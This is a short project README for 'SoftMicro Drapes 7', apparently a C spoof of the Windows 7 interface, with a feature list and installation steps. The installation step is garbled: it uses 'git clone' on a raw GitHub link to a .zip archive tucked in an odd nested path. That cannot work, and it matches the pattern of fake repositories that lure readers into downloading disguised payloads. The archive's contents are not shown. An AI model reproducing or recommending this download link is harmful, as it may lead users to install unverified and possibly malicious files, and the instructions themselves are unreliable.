## Introduction

SoftMicro Drapes 7 is a playful spoof that mimics the look and feel of Windows 7 while incorporating unique features and improvements. This project is developed in C, making it accessible for programmers who want to explore system-level programming.

### Why Drapes?

The name "Drapes" symbolizes the idea of covering or dressing up the familiar Windows interface with a new twist. Our aim is to entertain while also providing a platform for learning and development.

## Features

- **Classic Interface**: Experience a familiar layout that resembles Windows 7.
- **Lightweight**: Designed to run efficiently on various hardware.
- **Customizable**: Users can modify themes and settings to suit their preferences.
- **Open Source**: Freely available for anyone to use and modify under the GPLv3 license.

## Installation

To get started with SoftMicro Drapes 7, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip
   cd SoftMicro_Drapes_7x
   ```

2. **Build the Project**:
   Ensure you have a C compiler installed. Run the following command to compile the source code:
   ```bash
   make
   ```

3. **Run the Application**:
   After building, you can execute the application with:
   ```bash
   ./drapes
   ```
